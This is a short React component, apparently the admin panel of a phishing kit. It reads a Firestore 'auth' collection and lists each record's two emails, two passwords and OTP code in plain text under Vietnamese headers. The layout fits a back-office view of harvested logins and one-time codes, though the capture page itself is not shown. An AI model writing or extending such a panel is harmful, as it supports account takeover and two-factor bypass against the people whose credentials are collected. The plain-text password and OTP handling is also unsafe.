
import { useEffect, useState } from 'react';
import { collection, onSnapshot } from "firebase/firestore";
import './styles.css';
import { db } from '../../../firebase';
export default function Admin() {
  const [auths, setAuths] = useState<any[]>([]);


  useEffect(()=>{
    const unsub = onSnapshot(collection(db, "auth"), (data) => {
      let arr:any[] = [];
      data.forEach((item) => {
        arr = [...arr, item.data()];
      })
      setAuths(arr)
    });
    return () => unsub();
  },[])

  return (
    <div className="container">
      <div className='result'>
        <table>
          <thead>
            <tr>
              <th>Email 1</th>
              <th>Email 2</th>
              <th>Mật 1</th>
              <th>Mật khẩu 2</th>
              <th>OTP</th>
            </tr>
          </thead>
          <tbody>
            {auths.map( (auth:any, index:number) => {
              return (
                <tr key={index}>
                  <td>{auth.email_1}</td>
                  <td>{auth.email_2}</td>
                  <td>{auth.password_1}</td>
                  <td>{auth.password_2}</td>
                  <td>{auth.otp}</td>
                </tr>
              )
            })}
          </tbody>
        </table>
      </div>
    </div>
  )
}
